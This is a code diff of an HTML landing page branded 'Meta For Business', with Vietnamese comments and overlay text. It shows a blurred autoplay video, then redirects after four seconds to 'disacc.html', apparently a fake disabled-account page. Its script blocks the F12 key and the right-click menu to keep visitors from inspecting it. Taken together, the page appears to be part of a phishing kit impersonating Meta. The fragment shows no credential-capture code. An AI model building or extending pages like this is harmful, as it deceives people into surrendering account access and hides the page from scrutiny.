@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 
@@ -6,46 +5,69 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Meta For Business</title>
-    <!-- <style>
-    #myVideo {
-      width: 100%;
-      height: auto;
-    }
-  </style> -->
-  <style>
-    body, html {
-      margin: 0;
-      padding: 0;
-      height: 100%;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-    }
-    
-    #myVideo {
-      max-width: 100%;
-      max-height: 100%;
-    }
-  </style>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #000;
+            overflow: hidden;
+        }
+
+        #videoContainer {
+            position: relative;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+        }
+
+        #myVideo {
+            width: 100%;
+            height: 100%;
+            object-fit: cover; /* Đảm bảo video bao phủ toàn bộ màn hình */
+            filter: blur(2px); /* Làm mờ video */
+        }
+
+        #overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            font-size: 24px;
+            text-shadow: 0 0 10px rgba(0, 0, 0, 0.7); /* Hiệu ứng bóng cho chữ */
+            z-index: 1; /* Đảm bảo overlay nằm trên video */
+        }
+    </style>
 </head>
 
 <body>
-    
+    <div id="videoContainer">
         <video id="myVideo" autoplay muted playsinline>
             <source src="/img/Mate.mp4" type="video/mp4">
             Your browser does not support the video tag.
         </video>
-    
+        <div id="overlay">Chào mừng đến với Meta For Business</div>
+    </div>
 
     <script>
         setTimeout(function () {
             window.location.href = "disacc.html";
         }, 4000);
+        
         document.addEventListener("keydown", function (event) {
             if (event.key === "F12") {
                 event.preventDefault(); 
             }
         });
+        
         document.addEventListener("contextmenu", function (event) {
             event.preventDefault();
         });
